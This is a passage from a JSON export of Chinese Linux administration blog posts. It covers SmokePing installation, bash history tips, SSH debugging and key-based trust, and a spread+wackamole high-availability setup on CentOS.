type=\"sha\"&gt;e7fb32d7e1e683a57b3391e949cc98d9afec1e50&lt;/checksum&gt;\n&lt;checksum type=\"sha\"&gt;78a5ab04536a34f691606ebd1244fd63c548610c&lt;/checksum&gt;\n发现primary.xml.gz的校检有问题。\n我用了以下办法：\n<strong>1 使用--cache=off 用于清除缓存，这个方法其他还是有些作用的，有些时候会成功,就是将文件下载到本地，然后yum时候就不会去下载它了</strong>\n#wget --cache=off  http://www.mirrorservice.org/sites/apt.sw.be/redhat/el4/en/i386/dag/repodata/primary.xml.gz\n<strong>2 使用多线程工具下载到/var/cache/yum/，我使用的是myget</strong>\n3 使用--no-cache参数并修改/etc/yum.conf，添加http_caching=none\nwget --no-cache http://www.mirrorservice.org/sites/apt.sw.be/redhat/el4/en/i386/dag/repodata/primary.xml.gz\n但是都没有成功，后来我发现：当我wget下载primary.xml.gz时候，下载的地址被重定向了\n<span style=\"color: #ff0000;\">最后一个强烈建议，使用yum makecache ，将服务器上的软件包信息 现在本地缓存,以提高 搜索 安装软件的速度，可以做成定时任务。</span>\n最后在我的不懈尝试下，终于成功更新了。\n<strong>2 安装smokeping</strong>\n# yum install httpd\n# yum install rrdtool\n# yum install fping\n# yum install echoping\n# yum install curl\n# yum install perl perl-Net-Telnet perl-Net-DNS perl-LDAP  perl-libwww-perl perl-RadiusPerl perl-IO-Socket-SSL perl-Socket6  perl-CGI-SpeedyCGI\n# wget http://oss.oetiker.ch/smokeping/pub/smokeping-2.4.2.tar.gz\n# tar zxvf smokeping-2.4.2.tar.gz\n# mv smokeping-2.4.1 /opt/smokeping\n# cd /opt/smokeping/bin\n# cp smokeping.dist smokeping\n# cd ../htdocs/\n# cp smokeping.cgi.dist smokeping.cgi\n# cp tr.cgi.dist tr.cgi\n# cd ../etc/\n# cp config.dist config\n# cp basepage.html.dist basepage.html\n# cp smokemail.dist smokemail\n# cp tmail.dist tmail\n# cp smokeping_secrets.dist smokeping_secrets\n# chmod 600 /opt/smokeping/etc/smokeping_secrets\n<strong>3 配置smokeping</strong>\n<strong>编辑/opt/smokeping/bin/smokeping</strong>\n修改一下内容：\n[ccine_perl height=\"100%\" width=\"99%\"]\n#!/usr/sepp/bin/perl-5.8.4 -w\n# -*-perl-*-\nuse lib qw(/usr/pack/rrdtool-1.2.23-mo/lib/perl);\nuse lib qw(lib);\nuse Smokeping 2.004002;\nSmokeping::main(\"etc/config.dist\");\n[/ccine_perl]\n为\n[ccine_perl height=\"100%\" width=\"99%\"]\n#!/usr/bin/perl -w\n# -*-perl-*-\nuse lib qw(/usr/lib/perl5/vendor_perl/5.8.8/i386-linux-thread-multi/auto/RRDs/);（这个和编译安装的路径不同，注意）\nuse lib qw(/opt/smokeping/lib);\nuse Smokeping 2.004002;\nSmokeping::main(\"/opt/smokeping/etc/config\");\n[/ccine_perl]\n<strong>编辑/opt/smokeping/htdocs/smokeping.cgi</strong>\n修改以下内容：\n[ccine_perl height=\"100%\" width=\"99%\"]\n#!/usr/sepp/bin/speedy -w\n# -*-perl-*-\nuse lib qw(/usr/pack/rrdtool-1.0.33-to/lib/perl);\nuse lib qw(/home/oetiker/data/projects/AADJ-smokeping/dist/lib);\nuse CGI::Carp qw(fatalsToBrowser);\nuse Smokeping 2.004002;\nsmokeping::cgi(\"/home/oetiker/data/projects/AADJ-smokeping/dist/etc/config\");\n[/ccine_perl]\n为\n[ccine_perl height=\"100%\" width=\"99%\"]\n#!/usr/bin/speedy -w\n# -*-perl-*-\nuse lib qw(/usr/lib/perl5/vendor_perl/5.8.8/i386-linux-thread-multi/auto/RRDs);\nuse lib qw(/opt/smokeping/lib);\nuse CGI::Carp qw(fatalsToBrowser);\nuse Smokeping 2.004002;\nSmokeping::cgi(\"/opt/smokeping/etc/config\");\n[/ccine_perl]\n<strong>编辑/opt/smokeping/htdocs/tr.cgi</strong>\n修改以下内容：\n[ccine_perl height=\"100%\" width=\"99%\"]\n#!/usr/sepp/bin/speedy-5.8.8 -w\nuse strict;\nuse lib qw(/home/oposs/smokeping/software/lib);\nuse lib qw(perl);[/ccine_perl]\n为\n[ccine_perl height=\"100%\" width=\"99%\"]\n#!/usr/bin/speedy -w\nuse strict;\nuse lib qw(/opt/smokeping/lib);\nuse lib qw(perl);[/ccine_perl]\n<strong>编辑/opt/smokeping/etc/basepage.html</strong>\n修改以下内容\n[ccine_perl height=\"100%\" width=\"99%\"]\n&lt;script src=\"cropper/lib/prototype.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n&lt;script src=\"cropper/lib/scriptaculous.js?load=builder,dragdrop\" type=\"text/javascript\"&gt;&lt;/script&gt;\n&lt;script src=\"cropper/cropper.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n&lt;script src=\"cropper/smokeping-zoom.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n[/ccine_perl]\n<strong>修改traceroute权限</strong>\nchmod 4775 /bin/traceroute\n<strong>编辑apache配置：</strong>\n去掉AddHandler cgi-script .cgi前面的注释\n修改一下内容：[ccine_perl height=\"100%\" width=\"99%\"]\n&lt;script src=\"cropper/lib/prototype.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n&lt;script src=\"cropper/lib/scriptaculous.js?load=builder,dragdrop\"&gt;&lt;/script&gt;\n&lt;script src=\"cropper/cropper.js\"&gt;&lt;/script&gt;\n&lt;script src=\"cropper/smokeping-zoom.js\" type=\"text/javascript\"&gt;&lt;/script&gt;[/ccine_perl]\n为\n[ccine_perl height=\"100%\" width=\"99%\"]\n&lt;script src=\"/smokeping/cropper/lib/prototype.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n&lt;script src=\"/smokeping/cropper/lib/scriptaculous.js?load=builder,dragdrop\" type=\"text/javascript\"&gt;&lt;/script&gt;\n&lt;script src=\"/smokeping/cropper/cropper.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n&lt;script src=\"/smokeping/cropper/smokeping-zoom.js\" type=\"text/javascript\"&gt;&lt;/script&gt;[/ccine_perl]\n编辑/opt/smokeping/htdocs/tr.html\n修改为：\n[ccine_perl height=\"100%\" width=\"99%\"]\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;\n&lt;title&gt;SmokeTrace&lt;/title&gt;\n&lt;script src=\"/script/Tr.js\"&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;/html&gt;[/ccine_perl]\n<strong>编辑/opt/smokeping/etc/config</strong>\n[ccine_perl height=\"100%\" width=\"99%\"]\n*** General ***\nowner    = DONGWM\ncontact  = dongwm@dongwm.com\nmailhost = dongwm.com\nsendmail = /usr/sbin/sendmail\nimgcache = /opt/smokeping/htdocs/cache\nimgurl   = http://192.168.9.100/cache\ndatadir  = /opt/smokeping/data\npiddir  = /opt/smokeping/var\ncgiurl   = http://192.168.9.100/smokeping/smokeping.cgi\nsmokemail = /opt/smokeping/etc/smokemail\ntmail = /opt/smokeping/etc/tmail\n# specify this to get syslog logging\nsyslogfacility = local0\n# each probe is now run in its own process\n# disable this to revert to the old behaviour\n# concurrentprobes = no\n*** Alerts ***\nto = alertee@address.somewhere\nfrom = autopost@dongwm.com\n+someloss\ntype = loss\n# in percent\npattern = &gt;0%,*12*,&gt;0%,*12*,&gt;0%\ncomment = loss 3 times  in a row\n*** Database ***\nstep     = 300\npings    = 20\n# consfn mrhb steps total\nAVERAGE  0.5   1  1008\nAVERAGE  0.5  12  4320\nMIN  0.5  12  4320\nMAX  0.5  12  4320\nAVERAGE  0.5 144   720\nMAX  0.5 144   720\nMIN  0.5 144   720\n*** Presentation ***\ntemplate = /opt/smokeping/etc/basepage.html\n+ charts\nmenu = Charts\ntitle = The most interesting destinations\n++ stddev\nsorter = StdDev(entries=&gt;4)\ntitle = Top Standard Deviation\nmenu = Std Deviation\nformat = Standard Deviation %f\n++ max\nsorter = Max(entries=&gt;5)\ntitle = Top Max Roundtrip Time\nmenu = by Max\nformat = Max Roundtrip Time %f seconds\n++ loss\nsorter = Loss(entries=&gt;5)\ntitle = Top Packet Loss\nmenu = Loss\nformat = Packets Lost %f\n++ median\nsorter = Median(entries=&gt;5)\ntitle = Top Median Roundtrip Time\nmenu = by Median\nformat = Median RTT %f seconds\n+ overview\nwidth = 600\nheight = 50\nrange = 10h\n+ detail\nwidth = 600\nheight = 200\nunison_tolerance = 2\n\"Last 3 Hours\"    3h\n\"Last 30 Hours\"   30h\n\"Last 10 Days\"    10d\n\"Last 400 Days\"   400d\n#+ hierarchies\n#++ owner\n#title = Host Owner\n#++ location\n#title = Location\n*** Probes ***\n+ FPing\nbinary = /usr/sbin/fping\n*** Targets ***\nmenuextra = &lt;a target='_blank' href='/smokeping/tr.html{HOST}' class='{CLASS}' \\\nonclick=\"window.open(this.href,this.target, \\\n'width=800,height=500,toolbar=no,location=no,status=no,scrollbars=no'); \\\nreturn false;\"&gt;(TR)&lt;/a&gt;\nprobe = FPing\nmenu = Top\ntitle = Dongwm.com\nremark = Welcome to dongwm.com\n+ hosts\nmenu= Targets\n++ dongwm.com\nmenu = dongwm.com\ntitle = dongwm.com\nalerts = someloss\nhost = dongwm.com\n++ salogs.com\nmenu = salogs.cm\ntitle = salogs.com\nalerts = someloss\nhost = salogs.com[/ccine_perl]\n<strong>创建一个启动脚本：</strong>\n#vi /etc/init.d/smokeping\n添加为以下内容：\n[ccine_perl height=\"100%\" width=\"99%\"]\n#!/bin/bash\n#\n# chkconfig: 2345 80 05\n# Description: Smokeping init.d script\n# Hacked by : How2CentOS - http://www.how2centos.com\n# Get function from functions library\n. /etc/init.d/functions\n# Start the service Smokeping\nstart() {\necho -n \"Starting Smokeping: \"\n/opt/smokeping/bin/smokeping &gt;/dev/null 2&gt;&amp;1\n### Create the lock file ###\ntouch /var/lock/subsys/smokeping\nsuccess $\"Smokeping startup\"\necho\n}\n# Restart the service Smokeping\nstop() {\necho -n \"Stopping Smokeping: \"\nkill -9 `ps ax | grep \"/opt/smokeping/bin/smokeping\" | grep -v grep | awk '{ print $1 }'` &gt;/dev/null 2&gt;&amp;1\n### Now, delete the lock file ###\nrm -f /var/lock/subsys/smokeping\nsuccess $\"Smokeping shutdown\"\necho\n}\n### main logic ###\ncase \"$1\" in\nstart)\nstart\n;;\nstop)\nstop\n;;\nstatus)\nstatus Smokeping\n;;\nrestart|reload|condrestart)\nstop\nstart\n;;\n*)\necho $\"Usage: $0 {start|stop|restart|reload|status}\"\nexit 1\nesac\nexit 0\n[/ccine_perl]\n# chmod 755 /etc/init.d/smokeping\n<strong>最后启动服务：</strong>\n# chkconfig smokeping on\n# chkconfig httpd on\n# service smokeping start\nStarting Smokeping: [ OK ]\n# service httpd start\nStarting httpd: [ OK ]\n网页访问：http://192.168.9.100/smokeping/smokeping.cgi</p>\n",
    "date": {
      "year": "2010",
      "month": "December",
      "day": "28"
    }
  },
  {
    "id": 14,
    "title": "关于history命令研究",
    "category": "linux基础",
    "tags": [
      "history"
    ],
    "url": "/archives/%E5%85%B3%E4%BA%8Ehistory%E5%91%BD%E4%BB%A4%E7%A0%94%E7%A9%B6/",
    "content": "<p><strong>本文主要介绍一下几个要点内容：</strong></p>\n\n<p><strong>1 显示时间戳</strong></p>\n\n<p><strong>2 快速执行以前的命令</strong></p>\n\n<p><strong>3 去掉连续执行的重复命令</strong></p>\n\n<p><strong>4 一些技巧<!--more--></strong></p>\n\n<p><strong>1 显示时间戳</strong></p>\n\n<p>时间戳的功能还是很明显的，能够帮助我们根据操作时间排错等。\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\">[root@server ~]# export HISTTIMEFORMAT='%F %T '</td>\n</tr>\n</tbody>\n</table>\n重新执行后：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"609\">\n<tbody>\n<tr>\n<td width=\"607\" valign=\"top\">[root@server ~]# history |more\n5  2011-01-05 21:44:15 rake puppet:import:hosts_and_facts RAILS_ENV=production\n6  2011-01-05 21:44:15 rake puppet:migrate:populate_hosts RAILS_ENV=production\n7  2011-01-05 21:44:15 vi /etc/sysconfig/foreman\n8  2011-01-05 21:44:15 vi /etc/init.d/foreman</td>\n</tr>\n</tbody>\n</table>\n<strong>2 快速执行以前的命令</strong></p>\n\n<p>我们可以使用！，然后加上以前曾经使用过的一个命令其中的一些字母（假如输入的关键字执行过多次，会执行最近一次的命令去执行），回车执行：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"539\">\n<tbody>\n<tr>\n<td width=\"537\" valign=\"top\">这是我最近执行的一些命令：\n115  wget <a href=\"http://mirror.bjtu.edu.cn/gnu/bash/bash-4.1.tar.gz\">http://mirror.bjtu.edu.cn/gnu/bash/bash-4.1.tar.gz</a>\n116  vi /etc/passwd\n117  service iptables stop\n118  history\n119  service iptables stop\n120  history\n121  ifconfig\n122  updatedb\n123  locate ifenslave\n124  rpm -qf /sbin/ifup\n125  grep ifenslave /sbin/ifup\n126  history</td></tr></tbody></table></p>\n\n<p>[root@bogon ~]# !wg\nwget <a href=\"http://mirror.bjtu.edu.cn/gnu/bash/bash-4.1.tar.gz\">http://mirror.bjtu.edu.cn/gnu/bash/bash-4.1.tar.gz</a>（当我想执行第115行命令之输入了关键字“wg”）\n--2011-01-02 18:10:59--  <a href=\"http://mirror.bjtu.edu.cn/gnu/bash/bash-4.1.tar.gz\">http://mirror.bjtu.edu.cn/gnu/bash/bash-4.1.tar.gz</a>\nResolving mirror.bjtu.edu.cn...\n\n\n\n<strong>3 去掉连续执行的重复命令</strong></p>\n\n<p>日常使用中可能连续输入了一些命令，可以设置t HISTCONTROL，将去掉相同的记录，比如我下面执行三次passwd：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\">[root@bogon ~]# passwd test\n[root@bogon ~]# passwd test\n[root@bogon ~]# passwd test\n[root@bogon ~]#history | tail –4\n77 passwd test\n78 passwd test\n79 passwd test\n80 history | tail –4</td>\n</tr>\n</tbody>\n</table>\n修改配置及以后：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\">[root@bogon ~]# export HISTCONTROL=ignoredups\n[root@bogon ~]# passwd test\n[root@bogon ~]# passwd test\n[root@bogon ~]# passwd test\n[root@bogon ~]#history | tail –3\n81 export HISTCONTROL=ignoredups\n82 passwd test\n83 history | tail –3\n看到了吧：“passwd test”只显示了一次</td>\n</tr>\n</tbody>\n</table>\n<strong>4 一些技巧：</strong></p>\n\n<p><strong>1 工作可能会发生先去cat一个文件然后vi这个文件。但是我们却需要重新来写这个文件名，</strong></p>\n\n<p><strong>有没有简要办法？答案是利用一些技巧：</strong></p>\n\n<p><strong>重复前面的内容使用”!!:$”</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"424\">\n<tbody>\n<tr>\n<td width=\"422\" valign=\"top\">[root@bogon ~]# ls install.log\ninstall.log\n[root@bogon ~]# ll !!:$\nll install.log\n-rw-r--r-- 1 root root 32032 Aug 28 21:34 install.log</td>\n</tr>\n</tbody>\n</table>\n<strong>2 工作也会遇见同时操作几个文件，怎么快速的执行最开始的那个文件呢？答案是“!^”</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\">[root@bogon ~]# cp install.log install.log.bak\n[root@bogon ~]# ll !^\nll install.log\n-rw-r--r-- 1 root root 32032 Aug 28 21:34 install.log</td>\n</tr>\n</tbody>\n</table>\n<strong>3  刚执行一个操作其中一个文件的名字很长，我不想打那么长，快捷方式：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"453\">\n<tbody>\n<tr>\n<td width=\"451\" valign=\"top\">[root@bogon ~]# cp a b c /home/test\n[root@bogon ~]# cat !cp:2\ncat b\ni am b ^.^\n[root@bogon ~]# （在其中我假设b有很长的文件名或者路径很深，cp后的2代表位置，“$”表示最后一个位置）</td>\n</tr>\n</tbody>\n</table>\n<strong>4 忽略一些不重要的历史记录</strong></p>\n\n<p>可能由于工作需要，可能由于历史记录太多需要，所以我想过滤一些不重要的histroy记录:\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"475\">\n<tbody>\n<tr>\n<td width=\"473\" valign=\"top\">[root@bogon ~]# export HISTIGNORE=\"ls -F\"(\n多个命令用冒号分隔，如果想不使用过滤执行{export HISTIGNORE=\"\"}\n[root@bogon ~]# ls –F\n[root@bogon ~]# history\n163  ls\n164  history\n165  export HISTIGNORE=\"ls -F\"\n166  history （看见了吧，没有出现“ls -F”）</td>\n</tr>\n</tbody>\n</table></p>\n",
    "date": {
      "year": "2011",
      "month": "January",
      "day": "05"
    }
  },
  {
    "id": 15,
    "title": "关于ssh命令研究以及SSH信任详解",
    "category": "linux基础",
    "tags": [
      "ssh信任，ssh"
    ],
    "url": "/archives/%E5%85%B3%E4%BA%8Essh%E5%91%BD%E4%BB%A4%E7%A0%94%E7%A9%B6%E4%BB%A5%E5%8F%8Assh%E4%BF%A1%E4%BB%BB%E8%AF%A6%E8%A7%A3/",
    "content": "<p><strong>本文主要介绍一下几个要点内容：</strong></p>\n\n<p><strong>1  ssh客户端的DEBUG调试</strong></p>\n\n<p><strong>2  ssh的转义符用法（比如切换ssh会话）</strong></p>\n\n<p><strong>3  ssh的信任登陆（即登陆不需要手动输入密码）<!--more--></strong></p>\n\n<p><strong>1  ssh客户端的DEBUG调试</strong></p>\n\n<p>有时候我们有必要对于一些ssh连接故障通过调试信息确定问题和解决，选项-v即实现此功能。</p>\n\n<p><strong>例如没有使用debug信息：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"579\">\n<tbody>\n<tr>\n<td width=\"577\" valign=\"top\">[root@server ~]#  ssh -l root 192.168.9.104\nssh: connect to host 192.168.9.104 port 22: Connection refused</td>\n</tr>\n</tbody>\n</table>\n<strong>包含debug信息：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"578\">\n<tbody>\n<tr>\n<td width=\"576\" valign=\"top\">[root@server ~]#  ssh -v -l root 192.168.9.104\nOpenSSH_4.3p2, OpenSSL 0.9.8e-fips-rhel5 01 Jul 2008\ndebug1: Reading configuration data /etc/ssh/ssh_config\ndebug1: Applying options for *\ndebug1: Connecting to 192.168.9.104 [192.168.9.104] port 22.\ndebug1: connect to address 192.168.9.104 port 22: Connection refused\nssh: connect to host 192.168.9.104 port 22: Connection refused</td>\n</tr>\n</tbody>\n</table>\n这个信息说明，配置文件里面已经修改了默认的端口号</p>\n\n<p><strong>2  ssh的转义符用法</strong></p>\n\n<p>1  <strong>切换SSH会话：</strong>当你登录到本地主机使用SSH从远程主机，你可能要回来执行一些活动，然后再返回到远程主机了。在这种情况下，不需要断开SSH会话到远程主机。 而是按照下列步骤：</p>\n\n<p>1  远程登录到某台机器：server#ssh -l 用户名 主机名（或者IP）</p>\n\n<p><strong> </strong>2  现在已经在远程机器上：client#</p>\n\n<p><strong> </strong>3  回到localhost：先输入转义符“~”，然后输入ctrl+z，回车：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"502\">\n<tbody>\n<tr>\n<td width=\"500\" valign=\"top\">[root@client ~]# ~^Z [suspend ssh]</td></tr></tbody></table></p>\n\n<p>[1]+  Stopped                 ssh -l root 192.168.9.104 -p 9922\n[root@server ~]#\n\n\n\n4   现在又回到了本地主机，远程主机的SSH客户端会话作为后台运行的进程工作，检查运行如下所示：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"504\">\n<tbody>\n<tr>\n<td width=\"502\" valign=\"top\">[root@server ~]# jobs\n[1]+  Stopped                 ssh -l root 192.168.9.104 -p 9922</td>\n</tr>\n</tbody>\n</table>\n5    现在回到远程主机：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"504\">\n<tbody>\n<tr>\n<td width=\"502\" valign=\"top\">[root@server ~]# fg %1\nssh -l root 192.168.9.104 -p 9922\n[root@client ~]#</td>\n</tr>\n</tbody>\n</table>\n<strong> </strong></p>\n\n<p><strong> 2  ssh信任登陆：</strong></p>\n\n<p>在远程登陆主机的事情，都会要求你输入密码，这样很麻烦，尤其是在密码复杂不好记忆的时候。所以可以设置ssh信任，这样可以直接登陆而不需要输入账号密码信息。</p>\n\n<p><strong>实验要求：</strong></p>\n\n<p><strong>建立SSH信任\n将server主机做为客户端（发起SSH请求）\n将client主机作为服务器端（接收ssh请求）</strong></p>\n\n<p><strong>1.server主机生成公，私钥证书</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"534\">\n<tbody>\n<tr>\n<td width=\"532\" valign=\"top\">[root@server ~]# ssh-keygen -t dsa  #生成dsa算法的证书，rsa算法在-t后 加  rsa\nGenerating public/private dsa key pair.\nEnter file in which to save the key (/root/.ssh/id_dsa): #这一步询问私钥和公钥存放的地址，一般我们要将它放在这个默认的目录下，因此直接敲回车\nEnter passphrase (empty for no passphrase): #-这一步询问这个信任有关系是否需要密码，我们本来就是为了简化输入密码这个步骤的，当然这里就不需要密码了，因此直接回车\nEnter same passphrase again: #这一步是密码确认，直接回车\nYour identification has been saved in /root/.ssh/id_dsa.\nYour public key has been saved in /root/.ssh/id_dsa.pub.\nThe key fingerprint is:\n2e:f6:1b:00:23:9e:27:3f:19:48:83:89:e9:ee:d4:5e <a href=\"mailto:root@server.dongwm.com\">root@server.<span style=\"color: #000000;\">dongwm</span>.com</a></td>\n</tr>\n</tbody>\n</table>\n这步之后，生成2个文件：id_dsa和id_dsa.pub，其中id_dsa文件是私钥文件，而id_dsa.pub文件是公钥文件，接下来的步骤中我们就需要将id_dsa.pub里的内容添加到client的信任关系中</p>\n\n<p><strong>2. 在client机器上的用户XXX帐号下（我这里是root）的~/.ssh/authorized_keys或者~/.ssh/authorized_keys2中添加一行文件，即 id_dsa.pub里的内容，注意这个内容是一行，不要因为拷贝而带了额外的回车符。其中authorized_keys2表示采用ssh2登陆。</strong>\n<table style=\"height: 40px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"526\">\n<tbody>\n<tr>\n<td width=\"524\" valign=\"top\">[root@server ~]# scp -P 9922 ~/.ssh/id_dsa.pub root@client.okooo.com:/root/.ssh/authorized_keys</td>\n</tr>\n</tbody>\n</table>\n注：引入“ssh-copy-id ”这个命令</p>\n\n<p>ssh-copy-id 其实是一个自带的脚本，因为authorized_keys不容易记住，可以用如下格式：</p>\n\n<p># ssh-copy-id -i ~/.ssh/id_rsa.pub user@server效果和上面的一样。</p>\n\n<p>当不使用默认的22端口，使用这样的命令：</p>\n\n<p>#ssh-copy-id -i ~/.ssh/id_rsa.pub \"-p <span style=\"color: #ff0000;\">端口号码</span> user@server\"</p>\n\n<p>至此我们已经建立了机器server上root到机器client上用户root之间单向信任关系，即可以直接让机器server上的root直接登陆机器client上用户root，但是不能反过来操作，也不能用户其他用户。</p>\n\n<p>具体的原因实际上是基于PKI的非对称式加密的，在id_dsa是私钥文件，每次登陆的时候由它来生成一个签名文件，将这个签名文件发送给服务器client，服务器client从它的authorized_keys文件里找到登陆机器的公钥，利用这个公钥来验证签名是否合法，如果合法则登陆。</p>\n\n<p><strong>3.修改.ssh目录以及authorized_keys文件的可访问性</strong></p>\n\n<p>.ssh文件的访问性修改为700就可以了，authorized_keys要644</p>\n\n<p><strong>4.连接信息在/var/log/secure中</strong></p>\n",
    "date": {
      "year": "2011",
      "month": "January",
      "day": "05"
    }
  },
  {
    "id": 16,
    "title": "spread+wackamole打造全新高可用＋负载均衡",
    "category": "负载均衡",
    "tags": [
      "HA",
      "spread",
      "wackamole",
      "负载均衡"
    ],
    "url": "/archives/spreadwackamoledazaoquanxingaokeyongfuzaijunheng/",
    "content": "<p><strong>土豆运营团队称之为：穷人的劳斯莱斯。呵呵！我这里一直使用ZXTM，但是因为一些特殊的业务需要，新尝试了这种架构。我参考了土豆网站运维的文章，但是网上相关内容极少，并且含糊其词，所以写了本文。</strong><!--more-->\n<strong>1 这2款软件的功能以及和ZXTM，LVS等对比请参看土豆团队博文：http://blog.ops.tudou.com/wp/?p=188</strong>\n<strong>2 安装前准备：</strong>\n注：我也强调/etc/hosts文件内容的重要性，在安装前务必配置好想使用的IP和主机名，因为启动spread需要指定主机名，但是和土豆团队文章不同，我认为非根据`uname －n`，下面会提到。\n<strong>3 安装spread：</strong>\n我也选择了4.0.0版本，原因是最初使用4.1.0时出现了很多问题，但是欢迎大家去体验4.1.0版本，并留言给我\n<pre class=\"sh_bash\">\nwget http://www.spread.org/download/spread-src-4.0.0.tar.gz\ntar zxvf spread-src-4.0.0.tar.gz  &amp;&amp; cd spread-src-4.0.0 &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make install</pre>\n<strong>4 安装wackamole：</strong>\n下载地址为http://www.cnds.jhu.edu/download/download_wackamole.cgi 需要输入一下信息 点击下载\n<pre class=\"sh_bash\">\ntar zxvf wackamole-2.1.4.tar.gz &amp;&amp; cd wackamole-2.1.4 &amp;&amp; ./configure --with-perl &amp;&amp; make &amp;&amp; make install</pre>\n<strong>注：这个过程中可能会出现三个问题：</strong>\n1 Invalid configuration `x86_64-unknown-linux-gnu': machine `x86_64-unknown' not recognized\n<strong>解决办法</strong>：需要将2个文件拷贝过来覆盖此目录下文件：\n<pre class=\"sh_bash\">\ncp /usr/share/libtool/config.guess .\ncp /usr/share/libtool/config.sub .</pre>\n2 checking size of char... configure: error: cannot compute sizeof (char)\n<strong>解决办法</strong>：将安装的spread的lib目录定义在LD_LIBRARY_PATH里面，我的是空，所以直接赋值：\n<pre class=\"sh_bash\">#export LD_LIBRARY_PATH=/usr/local/lib（这个目录是默认安装的lib目录）</pre>\n3  后话了，在开启wackamole时可能出现：Starting wackamole.../usr/local/sbin/wackamole: error while loading shared libraries: libspread.so: cannot <pre class=\"sh_bash\">open shared object file: No such file or directory   [FAILED]</pre>\n<strong>解决办法</strong>：这个可能是因为在安装spread后没有执行ldconfig，如果还是不行，可以locate出来lib文件的目录地址放在/etc/ld.so.conf中，再执行ldconfig\n启动脚本大家可以参考一下土豆原博客，但是有写html码，并且spread的脚本有问题，启动和杀掉进程都有一些问题，不知道别人有没有这样的问题，但是我在最后会粘贴一下我改善过的脚本。\n<strong>\n5  配置原理：</strong>\n我的实验环境：\ncentos5.5\n想要达到的实验目的：\n对三个真实IP：192.168.9.160，192.168.9.161，192.168.9.162虚拟成三个虚拟IP（正常情况下每个真实IP使用一个虚拟IP）：192.168.9.109,192.168.9.112，192.168.9.113\n当出现故障时，虚拟IP自动“飘”到其他机器上。\n<strong>1 配置spread：</strong>\n他的spread.conf主要配置的是想要虚拟的组的设备上真实的IP和主机明的对应关系，以下是我的配置：\n首先看一下我的host文件：\n#vi /etc/hosts\n<pre class=\"sh_bash\">\n127.0.0.1               CentOS localhost.localdomain localhost\n192.168.9.160  test00.dongwm.com\n192.168.9.161  test01.dongwm.com\n192.168.9.162  test02.dongwm.com</pre>\n<pre class=\"sh_bash\">#vi spread.conf\nDaemonGroup = spread\nDaemonUser = spread\nEventLogFile = /usr/local/etc/spreadlog_%h.log\nEventPriority =  ERROR\nSpread_Segment  192.168.255.255:4803 {\ntest00.dongwm.com   192.168.9.160\ntest01.dongwm.com   192.168.9.161\ntest02.dongwm.com   192.168.9.162\n} #这是一种广播方式，还有一种多播配置方式</pre>\n注：每台机器都要开启此进程\n<strong>2 配置wackamole</strong>\n#vi wackamole.conf\n<pre class=\"sh_bash\">\nSpread = 4803@127.0.0.1 #表示监听的端口和地址，一般都不用修改，但是我认为可以只在一个机器上（假设server.dongwm.com）启动wackamole进程，\n然后其他节点的监听方式为： Spread = 4803@server.dongwm.com\nSpreadRetryInterval = 5s\nGroup = test   #这个类似于分布式消息系统，当你参加到这个组，就可以监听所有人，此程序进入此模式的命令是spuser 其中 j表示参加，l表示离开，有兴趣的可以研究下\nControl = /var/run/wack.it\nPrefer None   #这个就是提供一个优先选择的手段，我们这里的业务不需要，所以没有设置，设置方式参考官网的pdf文档\nVirtualInterfaces {\n{ eth0:192.168.9.109/32 }\n{ eth0:192.168.9.112/32 }\n{ eth0:192.168.9.113/32 }\n}               #这里就是想要虚拟的IP\nArp-Cache = 90s\nNotify {\neth0:192.168.8.1/32   #这是你路由器的地址，很重要的\narp-cache\n}\nbalance {\nAcquisitionsPerRound = all\ninterval = 4s\n}\nmature = 5s</pre>\n注：我也是每个机器都启动这个进程\n<strong>6 启动服务，查看日志：</strong>\n根据经验，最好先做以下2步：\n1  创建spread用户，加入你设定了其他用户，这步略过\n2  需要创建/var/run/spread/目录\n<strong>启动spread：</strong>\n<pre class=\"sh_bash\">/usr/local/sbin/spread -c  /usr/local/etc/spread.conf -n 你本机的主机名 （其中文件路径在编译时候./configure时候会告诉你具体地址，请注意）</pre>\n查看端口监听：\n<pre class=\"sh_bash\">#netstat -tunlp |grep 48\ntcp\t0\t0 0.0.0.0:4803\t0.0.0.0:*\tLISTEN\t18318/spread\nudp\t0\t0 0.0.0.0:4803\t0.0.0.0:*\t18318/spread\nudp\t0\t0 0.0.0.0:4804\t0.0.0.0:*\t18318/spread\n</pre>\n启动wacka mole：\n<pre class=\"sh_bash\">/etc/init.d/wackamole start</pre>\n查看日志：\n<pre class=\"sh_bash\">tail -f /var/log/messages</pre>\n会提示虚拟IP网卡启动了\n当三台服务器都启动后：\n执行ifconfig\n会发现每个服务器上飘了一个VIP：\n<pre class=\"sh_bash\">root@test02:~$ ifconfig\neth0      Link encap:Ethernet  HWaddr 